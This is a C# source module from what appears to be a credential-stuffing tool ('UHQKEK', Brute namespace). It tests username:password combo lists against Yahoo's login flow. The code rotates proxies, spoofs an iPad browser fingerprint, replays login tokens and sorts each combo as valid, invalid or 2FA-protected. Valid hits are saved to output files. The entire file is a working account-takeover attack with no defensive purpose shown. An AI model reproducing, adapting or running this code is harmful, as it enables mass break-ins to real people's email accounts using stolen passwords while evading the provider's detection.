using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Brute
{
    class Yahoo3
    {
        public static bool check(string combo)
        {
            try
            {

                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify()); 
                
                httpRequest.AllowAutoRedirect = false;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPad; CPU OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1");
                //httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("URL HERE").ToString();
                string url = str1.Replace("Found. Redirecting to ", "");
                //Console.WriteLine(url);

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPad; CPU OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1");
                httpRequest.AddHeader("Accept", "*/*");
                string str2 = httpRequest.Get("" + url).ToString();
                string AS = httpRequest.Cookies.GetCookies(url)["AS"].ToString();
                string AS1 = Cryptography.LR(AS, "s%3D", "%26d%3D").FirstOrDefault();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = false;
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("Accept-Encoding", "br, gzip, deflate");
                httpRequest.AddHeader("Accept-Language", "en-us");
                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                httpRequest.AddHeader("Cookie", "" + WebUtility.UrlDecode(AS));
                httpRequest.AddHeader("Host", "login.yahoo.com");
                httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPad; CPU OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                string str3 = httpRequest.Post("" + url, "browser-fp-data={\"language\":\"en-US\",\"colorDepth\":32,\"deviceMemory\":\"unknown\",\"pixelRatio\":2,\"hardwareConcurrency\":\"unknown\",\"timezoneOffset\":480,\"timezone\":\"America/Los_Angeles\",\"sessionStorage\":1,\"localStorage\":1,\"indexedDb\":1,\"openDatabase\":1,\"cpuClass\":\"unknown\",\"platform\":\"iPad\",\"doNotTrack\":\"0\",\"plugins\":{\"count\":0,\"hash\":\"24700f9f1986800ab4fcc880530dd0ed\"},\"canvas\":\"canvas winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"Apple Inc.~Apple A12X GPU\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":1,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":0,\"event\":1,\"start\":1},\"fonts\":{\"count\":13,\"hash\":\"ef5cebb772562bd1af018f7f69d53c9e\"},\"audio\":\"35.10893253237009\",\"resolution\":{\"w\":\"1024\",\"h\":\"1366\"},\"availableResolution\":{\"w\":\"1366\",\"h\":\"1024\"},\"ts\":{\"serve\":1605446267312,\"render\":1605446267572}}&crumb=VJLuCf7DX7Y&acrumb=" + AS1 + "&sessionIndex=QQ--&displayName=&deviceCapability=&username=" + strArray1[0] + "&passwd=&signin=Next", "application/x-www-form-urlencoded").ToString();
                //Console.WriteLine(str3);

                if (str3.Contains("/account/challenge/password"))
                {
                    string loc = str3.Replace("{\"location\":\"", "").Replace("\"}", "");
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = false;
                    httpRequest.AddHeader("Accept", "*/*");
                    httpRequest.AddHeader("Accept-Encoding", "br, gzip, deflate");
                    httpRequest.AddHeader("Accept-Language", "en-us");
                    httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                    httpRequest.AddHeader("Cookie: AS=", "" + AS);
                    httpRequest.AddHeader("Host", "login.yahoo.com");
                    httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                    httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPad; CPU OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1");
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    string str4 = httpRequest.Post("URL HERE" + loc, "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A32%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A%22unknown%22%2C%22timezoneOffset%22%3A480%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22iPad%22%2C%22doNotTrack%22%3A%220%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Apple+Inc.%7EApple+A12X+GPU%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A13%2C%22hash%22%3A%22ef5cebb772562bd1af018f7f69d53c9e%22%7D%2C%22audio%22%3A%2235.10893253237009%22%2C%22resolution%22%3A%7B%22w%22%3A%221024%22%2C%22h%22%3A%221366%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%221366%22%2C%22h%22%3A%221024%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1605446305503%2C%22render%22%3A1605446305689%7D%7D&crumb=VJLuCf7DX7Y&acrumb=" + AS1 + "&sessionIndex=QQ--&displayName=" + strArray1[0] + "&deviceCapability=&passwordContext=normal&password=" + strArray1[1] + "&verifyPassword=Next", "application/x-www-form-urlencoded").ToString();

                    if (str4.Contains("Redirecting to https://api.login.yahoo.com") || str4.Contains("https://maktoob.yahoo.com") || str4.Contains("https://mail.yahoo.com/") || str4.Contains("account/challenge/challenge-selector") || str4.Contains("https://login.yahoo.com/account/comm-channel/refresh") || str4.Contains("Don&#x27;t lose access to your account") || str4.Contains("Do not block yourself from logging in") || str4.Contains("Don't lose access to your account") || str4.Contains("https://login.yahoo.com/account/update") || str4.Contains("https://login.yahoo.com/account/fb-messenger-linking") || str4.Contains("Manage your Yahoo accounts") || str4.Contains("Found. Redirecting to https://api.login.yahoo.com") || str4.Contains("Logga ut") || str4.Contains("profile-accounts-link"))
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Green);
                        }
                        Program.Save(combo, "Yahoo");
                        return true;
                    }
                    else if (str4.Contains("account/challenge/password") || str4.Contains("Invalid password. Please try again") || str4.Contains("Invalid password") || str4.Contains("Please provide password"))
                    {
                        ++Program.Fail;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[-]" + combo, Color.Red);
                        }
                        return true;
                    }
                    else if (str4.Contains("https://login.yahoo.com/account/challenge/challenge-selector") || str4.Contains("unusual account activity") || str4.Contains("Open any Yahoo app") || str4.Contains("Help us to keep your account safe") || str4.Contains("We've noticed some unusual account activity") || str4.Contains("For your safety, choose a method below to verify that it&#x27;s really you signing in to this account") || str4.Contains("challenge yak-code-challenge"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Orange);
                        }
                        Program.Save(combo, "Yahoo 2FA");
                        return true;
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }
                }
                else if (str3.Contains("messages.INVALID_USERNAME") || str3.Contains("account/challenge/push?src=noSrc") || str3.Contains("account/challenge/push?src=noSrc") || str3.Contains("t seen you sign in from this device before"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else if (str3.Contains("account/challenge/phone-obfuscation") || str3.Contains(">Open any Yahoo app<"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Orange);
                    }
                    Program.Save(combo, "Yahoo 2FA");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }

            }
            catch (Exception)
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
